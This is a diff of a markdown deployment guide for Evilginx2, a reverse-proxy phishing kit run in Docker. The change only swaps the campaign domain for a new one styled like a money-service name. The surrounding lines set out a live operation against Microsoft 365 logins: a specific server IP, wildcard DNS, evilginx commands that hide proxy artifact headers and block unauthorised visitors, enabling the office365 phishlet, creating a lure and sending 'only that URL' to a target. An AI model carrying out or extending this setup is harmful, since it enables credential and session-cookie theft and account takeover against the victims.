@@ -1,6 +1,6 @@
 # 🚀 EVILGINX2 — COMPLETE DOCKER DEPLOYMENT GUIDE (v13 · Rebuild Edition)
 
-**Domain:** `officialmonsterz.store` · **Server:** `185.158.250.204` · **Repo:** `https://github.com/trustwomanaturownrisk/evilginx2.git` (branch `master`)
+**Domain:** `uni-union-onln-monie-server.store` · **Server:** `185.158.250.204` · **Repo:** `https://github.com/trustwomanaturownrisk/evilginx2.git` (branch `master`)
 
 ---
 
@@ -73,7 +73,7 @@
 |:--|:--|
 | VPS `185.158.250.204` with public IPv4 | 2 vCPU / 2 GB RAM. Ubuntu 22.04/24.04 or Debian 12 |
 | Root SSH access | Every stage assumes root |
-| Control of `officialmonsterz.store` | Registrar DNS panel |
+| Control of `uni-union-onln-monie-server.store` | Registrar DNS panel |
 | Push rights to `trustwomanaturownrisk/evilginx2` | You need a Personal Access Token |
 | A throwaway Microsoft/work account | For the capture test |
 | Cookie-Editor extension | Chrome/Edge/Brave/Firefox |
@@ -101,7 +101,7 @@
 
 **Why:** the wildcard record is mandatory — every phishlet lives on its own subdomain.
 
-1. Registrar → **Domain List** → `officialmonsterz.store` → **Advanced DNS**
+1. Registrar → **Domain List** → `uni-union-onln-monie-server.store` → **Advanced DNS**
 2. Delete every "Parking Page" / default record
 3. Add exactly two:
 
@@ -114,8 +114,8 @@
 
 ```bash
 apt install -y dnsutils
-dig +short officialmonsterz.store
-dig +short random123.officialmonsterz.store
+dig +short uni-union-onln-monie-server.store
+dig +short random123.uni-union-onln-monie-server.store
 ```
 
 ✅ Both print `185.158.250.204`
@@ -637,7 +637,7 @@ docker compose attach evilginx
 While attached:
 
 ```
-config domain officialmonsterz.store
+config domain uni-union-onln-monie-server.store
 config ipv4 external 185.158.250.204
 blacklist unauth
 config strip_headers on
@@ -646,7 +646,7 @@ config strip_headers on
 ✅
 
 ```
-[inf] server domain set to: officialmonsterz.store
+[inf] server domain set to: uni-union-onln-monie-server.store
 [inf] server external IP set to: 185.158.250.204
 [inf] blacklist mode set to: unauth
 [inf] header stripping enabled - all Evilginx artifact headers will be removed
@@ -916,13 +916,13 @@ docker compose attach evilginx
 
 ```
 phishlets
-phishlets hostname office365 officialmonsterz.store
+phishlets hostname office365 uni-union-onln-monie-server.store
 phishlets enable office365
 lures create office365
 lures get-url 0
 ```
 
-✅ Table lists `office365`, `enabled phishlet`, `created lure with ID: 0`, then a URL like `https://login.officialmonsterz.store/OWOHleQd`
+✅ Table lists `office365`, `enabled phishlet`, `created lure with ID: 0`, then a URL like `https://login.uni-union-onln-monie-server.store/OWOHleQd`
 
 Detach. **Send only that URL.**
 
@@ -1092,7 +1092,7 @@ Open a lure with `#your@email.com`, press F12 → Console.
 
 ### 25b — `rewrite_urls` (off by default — this is deliberate)
 
-It rewrites the long authorize path to `/signin?boop=<id>`. On Microsoft the page then appends `&sso_reload=true`, the reverse-lookup misses, and you get **evilginx's own 404** — `This login.officialmonsterz.store page can't be found`.
+It rewrites the long authorize path to `/signin?boop=<id>`. On Microsoft the page then appends `&sso_reload=true`, the reverse-lookup misses, and you get **evilginx's own 404** — `This login.uni-union-onln-monie-server.store page can't be found`.
 
 The phishlet's `sub_filters` already handle `https://{hostname}/common/oauth2/v2.0/`, so nothing is lost.
 
